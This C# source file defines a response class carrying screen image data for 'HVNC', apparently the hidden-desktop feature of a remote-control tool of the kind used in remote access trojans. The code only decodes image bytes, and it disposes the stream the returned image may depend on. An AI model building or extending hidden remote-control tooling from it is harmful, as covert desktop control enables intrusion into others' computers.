using System;
using System.Drawing;
using System.IO;

namespace RemoteControl.Protocals
{
    public class ResponseHVNCScreen : ResponseBase
    {
        public byte[] ImageData;
        public int Width;
        public int Height;

        public Image GetImage()
        {
            if (ImageData == null || ImageData.Length == 0)
                return null;

            using (MemoryStream ms = new MemoryStream(ImageData))
            {
                return Image.FromStream(ms);
            }
        }
    }
}
